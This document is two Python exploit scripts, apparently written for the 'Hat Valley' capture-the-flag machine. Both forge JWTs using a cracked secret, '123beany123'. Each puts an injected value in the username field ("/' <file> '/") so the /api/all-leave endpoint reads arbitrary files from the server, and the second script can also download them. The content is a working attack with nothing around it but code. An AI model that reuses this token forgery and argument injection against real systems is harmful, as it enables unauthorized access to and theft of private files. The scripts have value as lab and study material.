#!/usr/bin/python3

##
##

import requests
import sys
import jwt
import json

secret = '123beany123'

username = f"/' {sys.argv[1]} '/"

jwt_me = jwt.encode({'username': username, "iat": 1677354109},
              secret, algorithm='HS256')

print(jwt_me)

header = {'Cookie': 'token=' + jwt_me}
#proxies = {"http": "localhost:8080"}
##r = requests.get('http://hat-valley.htb/api/all-leave', headers=header, proxies=proxies)

r = requests.get('http://hat-valley.htb/api/all-leave', headers=header)

print(r.text)

##
##############
##

#!/usr/bin/python3

import jwt, requests, sys

if len(sys.argv) < 2:
   print(f"\n[\033[1;31m-\033[1;37m] Uso: python3 {sys.argv[0]} <archivo>\n")
   print("[\033[1;34m*\033[1;37m] Para descargar archivos puede usar -d\n")
   exit(1)

file = sys.argv[1]

def generateJWT(file: str) -> str:
    payload = { "username": "/' {} '/".format(file), "iat": 1666898953 }
    secret = "123beany123"
    token = jwt.encode(payload, secret)
    return token

token = generateJWT(file)
target = "http://hat-valley.htb/api/all-leave"
cookies = {"token":token}
request = requests.get(target, cookies=cookies)

try:
    if sys.argv[2] == '-d':
        with open(file.split("/")[-1].strip(),'wb') as f:
            f.write(request.content)

except:
    if request.text == "Failed to retrieve leave requests":
        print("\n[\033[1;31m-\033[1;37m] Archivo no encontrado\n")
        exit(1)
    else:
        print(request.text.strip())
        
##############
##
##
